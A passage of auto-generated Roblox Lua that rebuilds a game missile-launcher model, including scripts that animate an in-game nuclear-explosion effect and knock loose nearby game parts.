Part75.LeftSurface = Enum.SurfaceType.Weld
Part75.RightSurface = Enum.SurfaceType.Weld
Part75.TopSurface = Enum.SurfaceType.Smooth
Part75.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part75.Position = Vector3.new(12.8898983, 7.6000824, 38.9598885)
Part75.Orientation = Vector3.new(0, -90, 0)
Part75.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh76.Parent = Part75
BlockMesh76.Scale = Vector3.new(1.29999995, 1, 1)
BlockMesh76.Scale = Vector3.new(1.29999995, 1, 1)
Part77.Name = "BarrelPart"
Part77.Parent = Model1
Part77.Material = Enum.Material.Metal
Part77.BrickColor = BrickColor.new("Grime")
Part77.Rotation = Vector3.new(180, -90, 0)
Part77.FormFactor = Enum.FormFactor.Custom
Part77.Size = Vector3.new(2, 0.200000003, 2)
Part77.CFrame = CFrame.new(12.3898935, 10.6001215, 38.9598274, -5.20252797e-07, -4.67066002e-06, -1, -1.12105145e-05, -1, 5.14798012e-06, -1, 4.38485722e-06, 1.02310514e-05)
Part77.BackSurface = Enum.SurfaceType.Weld
Part77.BottomSurface = Enum.SurfaceType.Smooth
Part77.FrontSurface = Enum.SurfaceType.Weld
Part77.LeftSurface = Enum.SurfaceType.Weld
Part77.RightSurface = Enum.SurfaceType.Weld
Part77.TopSurface = Enum.SurfaceType.Weld
Part77.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part77.Position = Vector3.new(12.3898935, 10.6001215, 38.9598274)
Part77.Orientation = Vector3.new(0, -90, -180)
Part77.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh78.Parent = Part77
Part79.Name = "Swivel"
Part79.Parent = Model1
Part79.Material = Enum.Material.Metal
Part79.BrickColor = BrickColor.new("Grime")
Part79.Rotation = Vector3.new(0, 90, 0)
Part79.CanCollide = false
Part79.FormFactor = Enum.FormFactor.Custom
Part79.Size = Vector3.new(3, 0.200000003, 3)
Part79.CFrame = CFrame.new(12.889883, 8.10011101, 38.9598198, 1.50947981e-05, 5.43772376e-06, 1, -2.21862356e-05, 1, -5.9147028e-06, -1, -1.53604906e-05, 5.38406312e-06)
Part79.BottomSurface = Enum.SurfaceType.Weld
Part79.RightSurface = Enum.SurfaceType.Weld
Part79.TopSurface = Enum.SurfaceType.Weld
Part79.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part79.Position = Vector3.new(12.889883, 8.10011101, 38.9598198)
Part79.Orientation = Vector3.new(0, 90, 0)
Part79.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh80.Parent = Part79
CylinderMesh80.Offset = Vector3.new(0, -0.100000001, 0)
CylinderMesh80.Scale = Vector3.new(1, 1.5, 0.949999988)
CylinderMesh80.Scale = Vector3.new(1, 1.5, 0.949999988)
Script81.Parent = Part79
table.insert(cors,sandbox(Script81,function()
b = script.Parent
c = script.Parent.Parent.Connector

	local weld = Instance.new("Weld")

	weld.Part0 = c
	weld.Part1 = b

	weld.C0 = CFrame.new(0, -1, 0)

	weld.Parent = c

script.Parent.Parent.WER.Value = weld
end))
Part82.Name = "Missile"
Part82.Parent = Model1
Part82.Material = Enum.Material.SmoothPlastic
Part82.BrickColor = BrickColor.new("Quill grey")
Part82.Transparency = 1
Part82.Rotation = Vector3.new(180, 90, 0)
Part82.FormFactor = Enum.FormFactor.Symmetric
Part82.Size = Vector3.new(2.20000005, 1, 2)
Part82.CFrame = CFrame.new(-23.0097218, 11.8003483, 38.8605461, -1.99113638e-05, -5.20105959e-06, 1, 2.55717896e-05, -1, -6.13996826e-06, 1, 1.21387684e-05, 8.00541045e-07)
Part82.BottomSurface = Enum.SurfaceType.Weld
Part82.TopSurface = Enum.SurfaceType.Weld
Part82.Color = Color3.new(0.87451, 0.87451, 0.870588)
Part82.Position = Vector3.new(-23.0097218, 11.8003483, 38.8605461)
Part82.Orientation = Vector3.new(0, 90, 180)
Part82.Color = Color3.new(0.87451, 0.87451, 0.870588)
Fire83.Parent = Part82
Fire83.Size = 30
Fire83.Color = Color3.new(0.92549, 0.545098, 0.27451)
Fire83.Enabled = false
Fire83.Heat = 0
Fire83.SecondaryColor = Color3.new(0.545098, 0.313726, 0.215686)
Fire83.Color = Color3.new(0.92549, 0.545098, 0.27451)
Smoke84.Parent = Part82
Smoke84.Size = 15
Smoke84.Enabled = false
Smoke84.Opacity = 1
Smoke84.RiseVelocity = 25
Smoke85.Name = "Smoke1"
Smoke85.Parent = Part82
Smoke85.Size = 15
Smoke85.Enabled = false
Smoke85.Opacity = 1
Smoke85.RiseVelocity = 25
Smoke86.Name = "Smoke2"
Smoke86.Parent = Part82
Smoke86.Size = 15
Smoke86.Enabled = false
Smoke86.Opacity = 1
Smoke86.RiseVelocity = 25
Smoke87.Name = "Smoke3"
Smoke87.Parent = Part82
Smoke87.Size = 15
Smoke87.Enabled = false
Smoke87.Opacity = 1
Smoke87.RiseVelocity = 25
Smoke88.Name = "Smoke4"
Smoke88.Parent = Part82
Smoke88.Size = 15
Smoke88.Enabled = false
Smoke88.Opacity = 1
Smoke88.RiseVelocity = 25
BillboardGui89.Name = "Spark"
BillboardGui89.Parent = Part82
BillboardGui89.Size = UDim2.new(35, 0, 35, 0)
BillboardGui89.Enabled = false
BillboardGui89.Active = true
ImageLabel90.Name = "Light"
ImageLabel90.Parent = BillboardGui89
ImageLabel90.Transparency = 1
ImageLabel90.Size = UDim2.new(1, 0, 1, 0)
ImageLabel90.Active = true
ImageLabel90.BackgroundColor3 = Color3.new(0.756863, 0.752941, 0.764706)
ImageLabel90.BackgroundTransparency = 1
ImageLabel90.Image = "http://www.roblox.com/asset/?id=43708803"
Script91.Parent = BillboardGui89
table.insert(cors,sandbox(Script91,function()
script.Parent.Adornee = script.Parent.Parent
end))
SpecialMesh92.Parent = Part82
SpecialMesh92.MeshId = "http://www.roblox.com/asset/?id=74333739"
SpecialMesh92.Scale = Vector3.new(24, 24, 24)
SpecialMesh92.MeshType = Enum.MeshType.FileMesh
SpecialMesh92.Scale = Vector3.new(24, 24, 24)
Script93.Name = "Sabot"
Script93.Parent = Part82
Script93.Disabled = true
table.insert(cors,sandbox(Script93,function()
wait(.1)
function onTouch(hit)
script.Parent.Anchored = true
script.Parent.Parent = Workspace
script.Parent.Transparency = 1
wait()
script.Parent.Atom.Disabled = false
end

script.Parent.Touched:connect(onTouch)
end))
Script94.Name = "Atom"
Script94.Parent = Part82
Script94.Disabled = true
table.insert(cors,sandbox(Script94,function()
print("Nuke Em' All")

local CloudID= "http://www.roblox.com/asset/?id=1095708"
local ColorTexture = "http://www.roblox.com/asset/?ID=1361097"
local RingID = "http://www.roblox.com/asset/?id=3270017"
local SphereID = "http://www.roblox.com/asset/?id=1185246"

local BasePosition = script.Parent.Position

local Size = 50

local Exp = Instance.new("Model")
Exp.Name = "ATOMICEXPLOSION"
Exp.Parent = game.Workspace

local BasePart = Instance.new("Part")
BasePart.formFactor = 0
BasePart.TopSurface = 0
BasePart.BottomSurface = 0
BasePart.Anchored = true
BasePart.Locked = true
BasePart.CanCollide = false

local BaseMesh = Instance.new("SpecialMesh")
BaseMesh.MeshType = "FileMesh"

local CloudMesh = BaseMesh:clone()
CloudMesh.MeshId = CloudID
CloudMesh.TextureId = ColorTexture
CloudMesh.VertexColor = Vector3.new(0.9,0.6,0)

local RingMesh = BaseMesh:clone()
RingMesh.MeshId = RingID

local SphereMesh = BaseMesh:clone()
SphereMesh.MeshId = SphereID

local Clouds = {}
local ShockWave = {}
local Sky = script.Sky


function Effects()
	script.Explode:Play()
	delay(0,function() 
		for i = 5, 1,-0.01 do
			wait()
			game.Lighting.Brightness = i
		end
	end)
end

function Destruction(Pos,Radius)
	local function Destroy(Model)
		for i ,v in ipairs(Model:getChildren()) do
			if v:isA("BasePart") then
				if (v.Position-Pos).magnitude < Radius then
					if v.Anchored == false then
						v:BreakJoints()
						v.Velocity = CFrame.new(v.Position,Pos):vectorToWorldSpace(Vector3.new(math.random(-5,5),5,1000))
						v.Material = "CorrodedMetal"
					end	
				end
			end
			if #v:getChildren() > 0 then
				Destroy(v)
			end
		end
	end
	Destroy(game.Workspace)
end
function Explode(Pos)

local Base = BasePart:clone()
Base.Position = Pos
	
local Mesh = CloudMesh:clone()
Mesh.Parent = Base 
Mesh.Scale = Vector3.new(2.5,1,4.5)

local PoleBase = BasePart:clone()
PoleBase.Position = Pos+Vector3.new(0,0.1,0)

local PoleBaseMesh = CloudMesh:clone()
PoleBaseMesh.Scale = Vector3.new(1.25,2,2.5)
PoleBaseMesh.Parent = PoleBase

local Cloud1 = BasePart:clone()
Cloud1.Position = Pos+Vector3.new(0,0.75,0)

local Cloud1Mesh = CloudMesh:clone()
Cloud1Mesh.Scale = Vector3.new(0.5,3,1)
Cloud1Mesh.Parent = Cloud1
	
local Cloud2 = BasePart:clone()
Cloud2.Position = Pos+Vector3.new(0,1.25,0)
	
local Cloud2Mesh = CloudMesh:clone()
Cloud2Mesh.Scale = Vector3.new(0.5,1.5,1)
Cloud2Mesh.Parent = Cloud2

local Cloud3 = BasePart:clone()
Cloud3.Position = Pos+Vector3.new(0,1.7,0)
	
local Cloud3Mesh = CloudMesh:clone()
Cloud3Mesh.Scale = Vector3.new(0.5,1.5,1)
Cloud3Mesh.Parent = Cloud3

local PoleRing = BasePart:clone()
PoleRing.Position = Pos+Vector3.new(0,1.3,0)
PoleRing.Transparency = 0.2
PoleRing.BrickColor = BrickColor.new("Dark stone grey")
PoleRing.CFrame = PoleRing.CFrame*CFrame.Angles(math.rad(90),0,0)

local Mesh = RingMesh:clone()
Mesh.Scale = Vector3.new(1.2,1.2,1.2)
Mesh.Parent = PoleRing

local MushCloud = BasePart:clone()
MushCloud.Position = Pos+Vector3.new(0,2.3,0)
	
local MushMesh = CloudMesh:clone() -- lol
MushMesh.Scale = Vector3.new(2.5,1.75,3.5)
MushMesh.Parent = MushCloud

local TopCloud = BasePart:clone()
TopCloud.Position = Pos+Vector3.new(0,2.7,0)
	
local TopMesh = CloudMesh:clone()
TopMesh.Scale = Vector3.new(7.5,1.5,1.5)
TopMesh.Parent = TopCloud

table.insert(Clouds,Base)
table.insert(Clouds,TopCloud)
table.insert(Clouds,MushCloud)
table.insert(Clouds,Cloud1)
table.insert(Clouds,Cloud2)
table.insert(Clouds,Cloud3)
table.insert(Clouds,PoleBase)
table.insert(Clouds,PoleRing)


local BigRing = BasePart:clone()
BigRing.Position = Pos
BigRing.CFrame = BigRing.CFrame*CFrame.Angles(math.rad(90),0,0)
	
local BigMesh = RingMesh:clone()
BigMesh.Scale = Vector3.new(5,5,1)
BigMesh.Parent = BigRing
	
local SmallRing = BasePart:clone()
SmallRing.Position = Pos
SmallRing.BrickColor = BrickColor.new("Dark stone grey")
SmallRing.CFrame = SmallRing.CFrame*CFrame.Angles(math.rad(90),0,0)

local SmallMesh = RingMesh:clone()
SmallMesh.Scale = Vector3.new(4.6,4.6,1.5)
SmallMesh.Parent = SmallRing

local InnerSphere = BasePart:clone()
InnerSphere.Position = Pos
InnerSphere.BrickColor = BrickColor.new("Bright orange")
InnerSphere.Transparency = 0.5

local InnerSphereMesh = SphereMesh:clone()	
InnerSphereMesh.Scale = Vector3.new(-6.5,-6.5,-6.5)
InnerSphereMesh.Parent = InnerSphere
	
local OutterSphere = BasePart:clone()
OutterSphere.Position = Pos
OutterSphere.BrickColor = BrickColor.new("Bright orange")
OutterSphere.Transparency = 0.5

local OutterSphereMesh = SphereMesh:clone()
OutterSphereMesh.Scale = Vector3.new(6.5,6.5,6.5)
OutterSphereMesh.Parent = OutterSphere

table.insert(ShockWave,BigRing)	
table.insert(ShockWave,SmallRing)
table.insert(ShockWave,OutterSphere)
table.insert(ShockWave,InnerSphere)
	Sky.Parent = game.Lighting
	for i , v in ipairs(ShockWave) do
		v.Parent = Exp
	end
	for i , v in ipairs(Clouds) do
		v.Parent = Exp
	end
	Effects()
	delay(0,function()
		for resize = Size/2.5, Size*3, 2 do
			wait()
			BigRing.Mesh.Scale = Vector3.new(5*resize,5*resize,1*resize)
			SmallRing.Mesh.Scale = Vector3.new(4.6*resize,4.6*resize,1.5*resize)
			InnerSphere.Mesh.Scale = Vector3.new(-6.5*resize,-6.5*resize,-6.5*resize)
			OutterSphere.Mesh.Scale = Vector3.new(6.5*resize,6.5*resize,6.5*resize)
			Destruction(Pos,3*resize)
		end
		for fade = 0, 1, 0.01 do
			wait()
			pcall(function()
				for i ,v in ipairs(ShockWave) do
					v.Transparency = fade
				end
			end)
		end
		for i ,v in ipairs(ShockWave) do
			v:Remove()
		end
		done1 = true
	end)
	delay(0,function()
		for resize = Size/5, Size, 1 do
			wait()
			pcall(function()
				Base.Mesh.Scale = Vector3.new(2.5*resize,1*resize,4.5*resize)
				TopCloud.Mesh.Scale = Vector3.new(0.75*resize,1.5*resize,1.5*resize)
				MushCloud.Mesh.Scale = Vector3.new(2.5*resize,1.75*resize,3.5*resize)
				Cloud1.Mesh.Scale = Vector3.new(0.5*resize,3*resize,1*resize)
				Cloud2.Mesh.Scale = Vector3.new(0.5*resize,1.5*resize,1*resize)
				Cloud3.Mesh.Scale = Vector3.new(0.5*resize,1.5*resize,1*resize)
				PoleBase.Mesh.Scale = Vector3.new(1*resize,2*resize,2.5*resize)
				PoleRing.Mesh.Scale = Vector3.new(1.2*resize,1.2*resize,1.2*resize)

				Base.Position = Pos+Vector3.new(0,0.05*resize,0)
				TopCloud.Position = Pos+Vector3.new(0,2.7*resize,0)
				MushCloud.Position = Pos+Vector3.new(0,2.3*resize,0)
				Cloud1.Position = Pos+Vector3.new(0,0.75*resize,0)
				Cloud2.Position = Pos+Vector3.new(0,1.25*resize,0)
				Cloud3.Position = Pos+Vector3.new(0,1.7*resize,0)
				PoleBase.Position = Pos+Vector3.new(0,0.1*resize,0)
				PoleRing.Position = Pos+Vector3.new(0,1.3*resize,0)
			end)
		end
		done2 = true
	end)
	wait(2)
	for y = 0.6,0,-0.0025 do
		wait()
		for i , v in ipairs(Clouds) do
			v.Mesh.VertexColor = Vector3.new(0.9,y,0)
		end
	end
	for r = 0.9,0.5,-0.01 do
		wait()
		for i , v in ipairs(Clouds) do
			v.Mesh.VertexColor = Vector3.new(r,0,0)
		end
	end
	for by = 0,0.5,0.005 do
		wait()
		for i , v in ipairs(Clouds) do
			v.Mesh.VertexColor = Vector3.new(0.5,by,by)
			v.Transparency = by*2
		end
		Base.Mesh.Scale = Base.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		TopCloud.Mesh.Scale = TopCloud.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		MushCloud.Mesh.Scale = MushCloud.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		Cloud1.Mesh.Scale = Cloud1.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		Cloud2.Mesh.Scale = Cloud2.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		Cloud3.Mesh.Scale = Cloud3.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		PoleBase.Mesh.Scale = PoleBase.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		PoleRing.Mesh.Scale = PoleRing.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
	end
	done3 = true
	while true do wait(1) if done1 and done2 and done3 then break end end
	Exp:remove()
	wait(20)
	Sky:remove()
end


	

Explode(BasePosition)

script.Parent:remove()



	
	




end))
Sound95.Name = "Explode"
Sound95.Parent = Script94
Sound95.Pitch = 0.5
Sound95.SoundId = "http://www.roblox.com/asset?id=130768997"
Sound95.Volume = 1
Sky96.Parent = Script94
Sky96.SkyboxBk = "http://www.roblox.com/asset/?version=1&id=1012890"
Sky96.SkyboxDn = "http://www.roblox.com/asset/?version=1&id=1012891"
Sky96.SkyboxFt = "http://www.roblox.com/asset/?version=1&id=1012887"
Sky96.SkyboxLf = "http://www.roblox.com/asset/?version=1&id=1012889"
Sky96.SkyboxRt = "http://www.roblox.com/asset/?version=1&id=1012888"
Sky96.SkyboxUp = "http://www.roblox.com/asset/?version=1&id=1014449"
Part97.Name = "Effect"
Part97.Parent = Model1
Part97.Material = Enum.Material.SmoothPlastic
Part97.BrickColor = BrickColor.new("Earth green")
Part97.Transparency = 1
Part97.Rotation = Vector3.new(-90, 0, 90)
Part97.FormFactor = Enum.FormFactor.Symmetric
Part97.Size = Vector3.new(2.20000005, 1, 2)
Part97.CFrame = CFrame.new(-21.5097256, 11.3003311, 38.8604736, 1.99002643e-05, -1, 6.76171112e-06, -2.55639879e-05, 7.70061979e-06, 1, -1, -7.8946141e-07, -1.21309677e-05)
Part97.BottomSurface = Enum.SurfaceType.Weld
Part97.TopSurface = Enum.SurfaceType.Weld
Part97.Color = Color3.new(0.152941, 0.27451, 0.176471)
Part97.Position = Vector3.new(-21.5097256, 11.3003311, 38.8604736)
Part97.Orientation = Vector3.new(-90, 90, 0)
Part97.Color = Color3.new(0.152941, 0.27451, 0.176471)
Sound98.Name = "CSfire"
Sound98.Parent = Part97
Sound98.SoundId = "http://www.roblox.com/asset?id=132975999"
Sound98.Volume = 1
Sound99.Name = "Reload"
Sound99.Parent = Part97
Sound99.SoundId = "http://www.roblox.com/asset/?id=154199166"
Sound99.Volume = 1
SpecialMesh100.Parent = Part97
SpecialMesh100.Scale = Vector3.new(0.800000012, 8, 1)
SpecialMesh100.MeshType = Enum.MeshType.Sphere
SpecialMesh100.Scale = Vector3.new(0.800000012, 8, 1)
PointLight101.Parent = Part97
PointLight101.Color = Color3.new(1, 1, 0.498039)
PointLight101.Enabled = false
PointLight101.Color = Color3.new(1, 1, 0.498039)
Smoke102.Parent = Part97
Smoke102.Size = 50
Smoke102.Enabled = false
Smoke102.RiseVelocity = 10
Sound103.Name = "Fire"
Sound103.Parent = Part97
Sound103.Pitch = 0.5
Sound103.SoundId = "rbxassetid://181356975"
Sound103.Volume = 1
Model104.Name = "FakeMissile"
Model104.Parent = Model1
Part105.Name = "FakeMissile"
Part105.Parent = Model104
Part105.Material = Enum.Material.Metal
Part105.BrickColor = BrickColor.new("Quill grey")
Part105.Rotation = Vector3.new(180, 90, 0)
Part105.CanCollide = false
Part105.FormFactor = Enum.FormFactor.Custom
Part105.Size = Vector3.new(6.39999962, 1, 0.200000003)
Part105.CFrame = CFrame.new(-3.70967841, 11.0001984, 38.9599075, -1.99113711e-05, -5.20106005e-06, 1, 2.55717914e-05, -1, -6.13996781e-06, 1, 1.21387639e-05, 8.00539965e-07)
Part105.BottomSurface = Enum.SurfaceType.Weld
Part105.TopSurface = Enum.SurfaceType.Weld
Part105.Color = Color3.new(0.87451, 0.87451, 0.870588)
Part105.Position = Vector3.new(-3.70967841, 11.0001984, 38.9599075)
Part105.Orientation = Vector3.new(0, 90, 180)
Part105.Color = Color3.new(0.87451, 0.87451, 0.870588)
SpecialMesh106.Parent = Part105
SpecialMesh106.MeshId = "http://www.roblox.com/asset/?id=74333739"
SpecialMesh106.Scale = Vector3.new(25, 25, 24)
SpecialMesh106.MeshType = Enum.MeshType.FileMesh
SpecialMesh106.Scale = Vector3.new(25, 25, 24)
Part107.Name = "Warhead"
Part107.Parent = Model1
Part107.BrickColor = BrickColor.new("Institutional white")
Part107.Reflectance = 0.5
Part107.Transparency = 1
Part107.Rotation = Vector3.new(180, 0, 0)
Part107.Anchored = true
Part107.FormFactor = Enum.FormFactor.Plate
Part107.Size = Vector3.new(3.79999971, 6.59999943, 3.79999995)
Part107.CFrame = CFrame.new(-7.70991611, 33.3989334, 39.2596893, 0.999999702, -6.4844221e-06, -6.66087817e-06, -6.48497235e-06, -0.999999702, -1.0551862e-05, -6.67190989e-06, 1.05441059e-05, -1)
Part107.BottomSurface = Enum.SurfaceType.Weld
Part107.TopSurface = Enum.SurfaceType.Smooth
Part107.Color = Color3.new(0.972549, 0.972549, 0.972549)
Part107.Position = Vector3.new(-7.70991611, 33.3989334, 39.2596893)
Part107.Orientation = Vector3.new(0, -180, -180)
Part107.Color = Color3.new(0.972549, 0.972549, 0.972549)
SpecialMesh108.Parent = Part107
SpecialMesh108.MeshId = "http://www.roblox.com/asset/?id=1778999"
SpecialMesh108.Scale = Vector3.new(3, 5, 3)
SpecialMesh108.TextureId = "http://www.roblox.com/asset/?id=2821447"
SpecialMesh108.VertexColor = Vector3.new(0.600000024, 0.600000024, 0.600000024)
SpecialMesh108.MeshType = Enum.MeshType.FileMesh
SpecialMesh108.Scale = Vector3.new(3, 5, 3)
Smoke109.Parent = Part107
Smoke109.Size = 30
Smoke109.Enabled = false
Smoke109.Opacity = 1
Smoke109.RiseVelocity = 5
BillboardGui110.Name = "Light"
BillboardGui110.Parent = Part107
BillboardGui110.Size = UDim2.new(35, 0, 35, 0)
BillboardGui110.Enabled = false
BillboardGui110.Active = true
ImageLabel111.Name = "Light"
ImageLabel111.Parent = BillboardGui110
ImageLabel111.Transparency = 1
ImageLabel111.Size = UDim2.new(1, 0, 1, 0)
ImageLabel111.Active = true
ImageLabel111.BackgroundColor3 = Color3.new(0.756863, 0.752941, 0.764706)
ImageLabel111.BackgroundTransparency = 1
ImageLabel111.Image = "http://www.roblox.com/asset/?id=43708803"
Script112.Parent = BillboardGui110
table.insert(cors,sandbox(Script112,function()
script.Parent.Adornee = script.Parent.Parent
end))
Smoke113.Name = "Smoke2"
Smoke113.Parent = Part107
Smoke113.Size = 30
Smoke113.Enabled = false
Smoke113.Opacity = 1
Smoke113.RiseVelocity = 5
Smoke114.Name = "Smoke3"
Smoke114.Parent = Part107
Smoke114.Size = 30
Smoke114.Enabled = false
Smoke114.Opacity = 1
Smoke114.RiseVelocity = 5
Smoke115.Name = "Smoke4"
Smoke115.Parent = Part107
Smoke115.Size = 30
Smoke115.Enabled = false
Smoke115.Opacity = 1
Smoke115.RiseVelocity = 5
StringValue116.Name = "INFORMATION"
StringValue116.Parent = Part107
StringValue117.Name = "Nuke_Information"
StringValue117.Parent = StringValue116
StringValue117.Value = "Conventional, long-range warhead"
StringValue118.Name = "Nuke_Base"
StringValue118.Parent = StringValue116
StringValue118.Value = "TEL/Mobile"
Script119.Name = "Touch"
Script119.Parent = Part107
Script119.Disabled = true
table.insert(cors,sandbox(Script119,function()
wait(.1)
function onTouch(hit)
script.Parent.Anchored = true
script.Parent.Parent = Workspace
script.Parent.Transparency = 1
wait()
script.Parent.Atom.Disabled = false
end

script.Parent.Touched:connect(onTouch)
end))
Script120.Name = "Atom"
Script120.Parent = Part107
Script120.Disabled = true
table.insert(cors,sandbox(Script120,function()
print("Nuke Em' All")

local CloudID= "http://www.roblox.com/asset/?id=1095708"
local ColorTexture = "http://www.roblox.com/asset/?ID=1361097"
local RingID = "http://www.roblox.com/asset/?id=3270017"
local SphereID = "http://www.roblox.com/asset/?id=1185246"

local BasePosition = script.Parent.Position

local Size = 350

local Exp = Instance.new("Model")
Exp.Name = "ATOMICEXPLOSION"
Exp.Parent = game.Workspace

local BasePart = Instance.new("Part")
BasePart.formFactor = 0
BasePart.TopSurface = 0
BasePart.BottomSurface = 0
BasePart.Anchored = true
BasePart.Locked = true
BasePart.CanCollide = false

local BaseMesh = Instance.new("SpecialMesh")
BaseMesh.MeshType = "FileMesh"

local CloudMesh = BaseMesh:clone()
CloudMesh.MeshId = CloudID
CloudMesh.TextureId = ColorTexture
CloudMesh.VertexColor = Vector3.new(0.9,0.6,0)

local RingMesh = BaseMesh:clone()
RingMesh.MeshId = RingID

local SphereMesh = BaseMesh:clone()
SphereMesh.MeshId = SphereID

local Clouds = {}
local ShockWave = {}
local Sky = script.Sky


function Effects()
	script.Explode:Play()
	delay(0,function() 
		for i = 5, 1,-0.01 do
			wait()
			game.Lighting.Brightness = i
		end
	end)
end

function Destruction(Pos,Radius)
	local function Destroy(Model)
		for i ,v in ipairs(Model:getChildren()) do
			if v:isA("BasePart") then
				if (v.Position-Pos).magnitude < Radius then
					if v.Anchored == false then
						v:BreakJoints()
						v.Velocity = CFrame.new(v.Position,Pos):vectorToWorldSpace(Vector3.new(math.random(-5,5),5,1000))
						v.Material = "CorrodedMetal"
					end	
				end
			end
			if #v:getChildren() > 0 then
				Destroy(v)
			end
		end
	end
	Destroy(game.Workspace)
end
function Explode(Pos)

local Base = BasePart:clone()
Base.Position = Pos
	
local Mesh = CloudMesh:clone()
Mesh.Parent = Base 
Mesh.Scale = Vector3.new(2.5,1,4.5)

local PoleBase = BasePart:clone()
PoleBase.Position = Pos+Vector3.new(0,0.1,0)

local PoleBaseMesh = CloudMesh:clone()
PoleBaseMesh.Scale = Vector3.new(1.25,2,2.5)
PoleBaseMesh.Parent = PoleBase

local Cloud1 = BasePart:clone()
Cloud1.Position = Pos+Vector3.new(0,0.75,0)

local Cloud1Mesh = CloudMesh:clone()
Cloud1Mesh.Scale = Vector3.new(0.5,3,1)
Cloud1Mesh.Parent = Cloud1
	
local Cloud2 = BasePart:clone()
Cloud2.Position = Pos+Vector3.new(0,1.25,0)
	
local Cloud2Mesh = CloudMesh:clone()
Cloud2Mesh.Scale = Vector3.new(0.5,1.5,1)
Cloud2Mesh.Parent = Cloud2

local Cloud3 = BasePart:clone()
Cloud3.Position = Pos+Vector3.new(0,1.7,0)
	
local Cloud3Mesh = CloudMesh:clone()
Cloud3Mesh.Scale = Vector3.new(0.5,1.5,1)
Cloud3Mesh.Parent = Cloud3

local PoleRing = BasePart:clone()
PoleRing.Position = Pos+Vector3.new(0,1.3,0)
PoleRing.Transparency = 0.2
PoleRing.BrickColor = BrickColor.new("Dark stone grey")
PoleRing.CFrame = PoleRing.CFrame*CFrame.Angles(math.rad(90),0,0)

local Mesh = RingMesh:clone()
Mesh.Scale = Vector3.new(1.2,1.2,1.2)
Mesh.Parent = PoleRing

local MushCloud = BasePart:clone()
MushCloud.Position = Pos+Vector3.new(0,2.3,0)
	
local MushMesh = CloudMesh:clone() -- lol
MushMesh.Scale = Vector3.new(2.5,1.75,3.5)
MushMesh.Parent = MushCloud

local TopCloud = BasePart:clone()
TopCloud.Position = Pos+Vector3.new(0,2.7,0)
	
local TopMesh = CloudMesh:clone()
TopMesh.Scale = Vector3.new(7.5,1.5,1.5)
TopMesh.Parent = TopCloud

table.insert(Clouds,Base)
table.insert(Clouds,TopCloud)
table.insert(Clouds,MushCloud)
table.insert(Clouds,Cloud1)
table.insert(Clouds,Cloud2)
table.insert(Clouds,Cloud3)
table.insert(Clouds,PoleBase)
table.insert(Clouds,PoleRing)


local BigRing = BasePart:clone()
BigRing.Position = Pos
BigRing.CFrame = BigRing.CFrame*CFrame.Angles(math.rad(90),0,0)
	
local BigMesh = RingMesh:clone()
BigMesh.Scale = Vector3.new(5,5,1)
BigMesh.Parent = BigRing
	
local SmallRing = BasePart:clone()
SmallRing.Position = Pos
SmallRing.BrickColor = BrickColor.new("Dark stone grey")
SmallRing.CFrame = SmallRing.CFrame*CFrame.Angles(math.rad(90),0,0)

local SmallMesh = RingMesh:clone()
SmallMesh.Scale = Vector3.new(4.6,4.6,1.5)
SmallMesh.Parent = SmallRing

local InnerSphere = BasePart:clone()
InnerSphere.Position = Pos
InnerSphere.BrickColor = BrickColor.new("Bright orange")
InnerSphere.Transparency = 0.5

local InnerSphereMesh = SphereMesh:clone()	
InnerSphereMesh.Scale = Vector3.new(-6.5,-6.5,-6.5)
InnerSphereMesh.Parent = InnerSphere
	
local OutterSphere = BasePart:clone()
OutterSphere.Position = Pos
OutterSphere.BrickColor = BrickColor.new("Bright orange")
OutterSphere.Transparency = 0.5

local OutterSphereMesh = SphereMesh:clone()
OutterSphereMesh.Scale = Vector3.new(6.5,6.5,6.5)
OutterSphereMesh.Parent = OutterSphere

table.insert(ShockWave,BigRing)	
table.insert(ShockWave,SmallRing)
table.insert(ShockWave,OutterSphere)
table.insert(ShockWave,InnerSphere)
	Sky.Parent = game.Lighting
	for i , v in ipairs(ShockWave) do
		v.Parent = Exp
	end
	for i , v in ipairs(Clouds) do
		v.Parent = Exp
	end
	Effects()
	delay(0,function()
		for resize = Size/2.5, Size*3, 2 do
			wait()
			BigRing.Mesh.Scale = Vector3.new(5*resize,5*resize,1*resize)
			SmallRing.Mesh.Scale = Vector3.new(4.6*resize,4.6*resize,1.5*resize)
			InnerSphere.Mesh.Scale = Vector3.new(-6.5*resize,-6.5*resize,-6.5*resize)
			OutterSphere.Mesh.Scale = Vector3.new(6.5*resize,6.5*resize,6.5*resize)
			Destruction(Pos,3*resize)
		end
		for fade = 0, 1, 0.01 do
			wait()
			pcall(function()
				for i ,v in ipairs(ShockWave) do
					v.Transparency = fade
				end
			end)
		end
		for i ,v in ipairs(ShockWave) do
			v:Remove()
		end
		done1 = true
	end)
	delay(0,function()
		for resize = Size/5, Size, 1 do
			wait()
			pcall(function()
				Base.Mesh.Scale = Vector3.new(2.5*resize,1*resize,4.5*resize)
				TopCloud.Mesh.Scale = Vector3.new(0.75*resize,1.5*resize,1.5*resize)
				MushCloud.Mesh.Scale = Vector3.new(2.5*resize,1.75*resize,3.5*resize)
				Cloud1.Mesh.Scale = Vector3.new(0.5*resize,3*resize,1*resize)
				Cloud2.Mesh.Scale = Vector3.new(0.5*resize,1.5*resize,1*resize)
				Cloud3.Mesh.Scale = Vector3.new(0.5*resize,1.5*resize,1*resize)
				PoleBase.Mesh.Scale = Vector3.new(1*resize,2*resize,2.5*resize)
				PoleRing.Mesh.Scale = Vector3.new(1.2*resize,1.2*resize,1.2*resize)

				Base.Position = Pos+Vector3.new(0,0.05*resize,0)
				TopCloud.Position = Pos+Vector3.new(0,2.7*resize,0)
				MushCloud.Position = Pos+Vector3.new(0,2.3*resize,0)
				Cloud1.Position = Pos+Vector3.new(0,0.75*resize,0)
				Cloud2.Position = Pos+Vector3.new(0,1.25*resize,0)
				Cloud3.Position = Pos+Vector3.new(0,1.7*resize,0)
